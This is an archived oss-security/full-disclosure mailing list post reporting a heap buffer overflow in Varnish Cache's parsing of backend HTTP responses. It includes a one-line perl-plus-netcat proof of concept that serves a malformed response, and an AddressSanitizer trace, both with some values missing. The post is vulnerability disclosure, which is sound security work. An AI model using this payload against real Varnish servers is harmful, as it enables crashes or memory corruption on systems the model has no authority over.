  oss-security - Varnish heap-buffer-overflow while parsing backend server HTTP  response.            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Mon, 9 Mar From: Marek Kroemeke <kroemeke@...il.com> To: fulldisclosure@...lists.org Cc: oss-security@...ts.openwall.com Subject: Varnish heap-buffer-overflow while parsing backend server HTTP  response.  Hi there,  Latest varnish-cache (https://www.varnish-cache.org/) seem to have a problem with parsing HTTP responses from backend. The following example response will trigger a heap buffer overflow :  -- cut -- perl -e 'print "HTTP/1.1 OK\r\nContent-Length: dupa" . "\n" x . "A" x . "\n" ' | nc -l -- cut --  assuming your config uses as backend.   meh kernel: traps: general protection error:0 in  Original asan report : --- cut --- ================================================================= AddressSanitizer: heap-buffer-overflow on address at pc bp sp WRITE of size at thread     #0     #1 in HTTP1_Read     #2 in v1f_pull_straight     #3 in vfp_call     #4 in VFP_Suck     #5 in VFP_Fetch_Body     #6 in vbf_stp_fetch     #7 in vbf_fetch_thread     #8 in Pool_Work_Thread     #9 in wrk_thread_real     #10 in WRK_thread     #11 in start_thread     #12 in __clone  is located 0 bytes to the right of region allocated by thread here:     #0 in __interceptor_malloc     #1 in sma_alloc     #2 in stv_alloc     #3 in stv_alloc_obj     #4 in STV_alloc     #5 in VFP_GetStorage     #6 in VFP_Fetch_Body     #7 in vbf_stp_fetch     #8 in vbf_fetch_thread     #9 in Pool_Work_Thread     #10 in wrk_thread_real     #11 in WRK_thread     #12 in start_thread  Thread created by T16 here:     #0 in __interceptor_pthread_create     #1 in pool_breed     #2 in pool_herder     #3 in start_thread Thread T16 created by T6 here:     #0 in __interceptor_pthread_create     #1 in pool_mkpool     #2 in pool_poolherder     #3 in start_thread  Thread T6 created by T0 here:     #0 in __interceptor_pthread_create     #1 in Pool_Init     #2 in child_main     #3 in mgt_launch_child     #4 in mgt_reap_child     #5 in child_listener     #6 in vev_schedule_one     #7 in vev_schedule     #8 in MGT_Run     #9 in main     #10 in __libc_start_main  SUMMARY: AddressSanitizer: heap-buffer-overflow ??:0 ?? Shadow bytes around the buggy address:   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa   fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  --- cut ---  Our understanding after previous reports is that varnish security model assumes full trust of the backend, so this is not considered a security problem (but we do).  Best regards,  Filip Palian Akat1 Marek Kroemeke  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      